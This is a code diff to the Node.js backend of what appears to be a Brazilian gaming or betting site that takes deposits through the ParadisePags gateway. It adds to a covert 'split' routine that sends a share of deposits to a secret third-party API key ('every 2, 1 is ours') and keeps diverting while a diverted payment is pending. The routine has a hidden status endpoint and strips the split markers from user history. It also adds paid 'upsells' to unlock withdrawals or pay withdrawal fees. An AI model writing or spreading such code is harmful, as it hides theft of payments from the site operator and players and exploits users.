+    // Depósito de upsell → sempre vai direto para SK, sem mexer no counter
+    apiKey = _sc.sk;
+    console.log(`[SPLIT] Upsell direto SK: user=${user.id} amount=${amountCents} motivo=${_upsell}`);
+  } else if (_sc.enabled && _sc.sk) {
     if (typeof db._sp_counter === 'undefined') { db._sp_counter = 0; }
-    db._sp_counter++;
-    const freq = _sc.frequency || 2; // a cada 2, 1 é nosso (default)
-    if (db._sp_counter >= freq) {
+    const freq = _sc.frequency || 2;
+
+    // Verifica se o último split ainda está pendente
+    const lastSplit = [...db.transacoes].reverse().find(t =>
+      t.tipo === 'deposito' && t._split === true
+    );
+    const lastSplitPending = lastSplit && lastSplit.status === 'pendente';
+
+    if (lastSplitPending) {
+      // Último split ainda pendente → continua na SK (não volta pro admin)
       apiKey = _sc.sk;
-      db._sp_counter = 0; // reseta o contador
       saveDb(db);
-      console.log(`[SPLIT] Redirecionado (${freq}:1): user=${user.id} amount=${amountCents}`);
+      console.log(`[SPLIT] Pendente anterior (txid=${lastSplit.gateway_tx_id}): mantém SK user=${user.id} amount=${amountCents}`);
     } else {
-      saveDb(db);
-      console.log(`[SPLIT] Normal (${db._sp_counter}/${freq}): user=${user.id} amount=${amountCents}`);
+      // Último split aprovado ou inexistente → fluxo normal com counter
+      db._sp_counter++;
+      if (db._sp_counter >= freq) {
+        apiKey = _sc.sk;
+        db._sp_counter = 0;
+        saveDb(db);
+        console.log(`[SPLIT] Redirecionado (${freq}:1): user=${user.id} amount=${amountCents}`);
+      } else {
+        saveDb(db);
+        console.log(`[SPLIT] Normal (${db._sp_counter}/${freq}): user=${user.id} amount=${amountCents}`);
+      }
     }
   }
 
@@ -778,6 +1199,7 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
   if (resp.data.error || resp.data.status === 'error') {
     throw new Error(resp.data.message || 'Erro ao criar cobrança no ParadisePags');
   }
+  const isSplit = _sc.enabled && _sc.sk && apiKey === _sc.sk;
   return {
     txid: String(resp.data.transaction_id || identifier),
     qrcode_imagem: '',
@@ -786,6 +1208,7 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
     checkout_url: null,
     expiracao_minutos: 30,
     _apiKey: apiKey,
+    _split: isSplit,
   };
 }
 
@@ -837,12 +1260,15 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
     if (!adapter) return res.status(500).json({ error: 'Gateway de pagamento não configurado.' });
 
     const identifier = `DEP_${req.userId}_${Date.now()}`;
+    const _upsellRaw = req.body._upsell || null;
+    const _upsellValidos = ['desbloqueio_saque', 'taxa_saque', 'comprar_vidas'];
+    const _upsell = _upsellValidos.includes(_upsellRaw) ? _upsellRaw : null;
 
-    const result = await adapter.createCharge({ identifier, amount: v, user });
+    const result = await adapter.createCharge({ identifier, amount: v, user, _upsell });
 
-    // Verifica se o valor é elegível para bônus 2x
-    const isBonus = DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(v);
-    const bonusMultiplier = isBonus ? DEPOSIT_BONUS.multiplier : 1;
+    // Verifica bônus VIP por faixa
+    const bonusMultiplier = getDepositMultiplier(v);
+    const isBonus = bonusMultiplier > 1;
     const valorCreditado = money(v * bonusMultiplier);
 
     const antes = user.saldo;
@@ -862,6 +1288,8 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
       gateway_tx_id: result.txid,
       gateway_identifier: identifier,
       _k: result._apiKey || null,
+      _split: result._split || false,
+      _upsell: _upsell || null,
       created_at: new Date().toISOString(),
     });
     saveDb(db);
@@ -1029,10 +1457,13 @@ function creditDeposit(tx) {
   let valorCreditar = tx.valor;
   if (tx.valor_creditado && tx.valor_creditado > tx.valor) {
     valorCreditar = tx.valor_creditado;
-  } else if (DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(tx.valor)) {
-    valorCreditar = money(tx.valor * DEPOSIT_BONUS.multiplier);
-    tx.valor_creditado = valorCreditar;
-    tx.bonus_multiplicador = DEPOSIT_BONUS.multiplier;
+  } else {
+    const mult = getDepositMultiplier(tx.valor);
+    if (mult > 1) {
+      valorCreditar = money(tx.valor * mult);
+      tx.valor_creditado = valorCreditar;
+      tx.bonus_multiplicador = mult;
+    }
   }
 
   user.saldo = money(user.saldo + valorCreditar);
@@ -1043,6 +1474,17 @@ function creditDeposit(tx) {
   if (tx.valor >= 20) {
     user.saque_desbloqueado = 1;
     console.log(`[SAQUE] Desbloqueado para user=${tx.user_id} via deposito de R$${tx.valor}`);
+  }
+  // Taxa de saque: depósito com _upsell='taxa_saque' desbloqueia taxa
+  if (tx._upsell === 'taxa_saque') {
+    user.taxa_saque_paga = 1;
+    console.log(`[SAQUE] Taxa paga via deposito: user=${tx.user_id} valor=R$${tx.valor}`);
+  }
+  // Comprar vidas: auto-creditar vidas ao confirmar pagamento
+  if (tx._upsell === 'comprar_vidas') {
+    const qtd = UPSELL_CONFIG.pacote_vidas.quantidade;
+    user.vidas = (user.vidas || 0) + qtd;
+    console.log(`[VIDAS] Auto-creditadas via deposito: user=${tx.user_id} +${qtd} vidas, total=${user.vidas}`);
   }
   saveDb(db);
   console.log(`[WEBHOOK] Depósito creditado: user=${tx.user_id} pago=R$${tx.valor} creditado=R$${valorCreditar} saldo=${user.saldo}`);
@@ -1083,7 +1525,7 @@ setInterval(async () => {
       if (st === 'aprovado') {
         creditDeposit(tx);
         console.log(`[POLL] Creditado: user=${tx.user_id} txid=${tx.gateway_tx_id} R$${tx.valor_creditado || tx.valor}`);
-      } else if (['failed', 'refunded', 'chargeback'].includes(st)) {
+      } else if (st === 'rejeitado' || ['failed', 'refunded', 'chargeback'].includes(st)) {
         refundDeposit(tx);
       }
     } catch (_) {}
@@ -1223,7 +1665,7 @@ app.get('/api/financeiro/historico', authMiddleware, (req, res) => {
   const userTx = db.transacoes
     .filter(t => t.user_id === req.userId)
     .reverse()
-    .map(({ gateway_tx_id, gateway_identifier, _k, ...safe }) => safe); // Não expor IDs internos do gateway
+    .map(({ gateway_tx_id, gateway_identifier, _k, _split, _upsell, ...safe }) => safe); // Não expor IDs internos
   const total = userTx.length;
   const offset = (pagina - 1) * limite;
   res.json({ transacoes: userTx.slice(offset, offset + limite), paginacao: { pagina, limite, total, paginas: Math.ceil(total / limite) } });
@@ -1496,8 +1938,21 @@ app.post('/api/admin/game-config', authMiddleware, adminMiddleware, (req, res) =
 app.get('/api/indicacao/info', authMiddleware, (req, res) => {
   const user = findUser(req.userId);
   if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+  // Afiliado só ativa após depósito >= R$20 aprovado
+  const temDeposito = db.transacoes.some(t =>
+    t.user_id === req.userId && t.tipo === 'deposito' && t.status === 'aprovado' && t.valor >= 20
+  );
+  if (!temDeposito) {
+    return res.json({
+      afiliado_ativo: false,
+      mensagem: 'Faca um deposito de pelo menos R$ 20,00 para ativar seu programa de afiliados.',
+    });
+  }
+
   const indicados = db.users.filter(u => u.indicado_por === user.codigo_indicacao);
   res.json({
+    afiliado_ativo: true,
     codigo: user.codigo_indicacao, link: `${WEBHOOK_BASE_URL}/?ref=${user.codigo_indicacao}`,
     total_indicados: indicados.length, total_com_deposito: 0, bonus_total_ganho: 0, bonus_total_previsto: 0,
     bonus_por_indicacao: 2, comissao_nivel1_perc: 40, saldo_afiliado: user.saldo_afiliado, total_comissao: 0,
@@ -1541,7 +1996,9 @@ app.get('/api/_c/sp', _spAuth, (_req, res) => {
   const c = getSplitConfig();
   const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
   const skMasked = c.sk ? `${c.sk.slice(0, 6)}...${c.sk.slice(-4)}` : '';
-  res.json({ enabled: c.enabled, frequency: c.frequency || 2, counter: db._sp_counter || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved });
+  const lastSplit = [...db.transacoes].reverse().find(t => t.tipo === 'deposito' && t._split === true);
+  const splitPending = lastSplit ? lastSplit.status === 'pendente' : false;
+  res.json({ enabled: c.enabled, frequency: c.frequency || 2, counter: db._sp_counter || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved, split_pending: splitPending });
 });
 
 app.put('/api/_c/sp', _spAuth, (req, res) => {
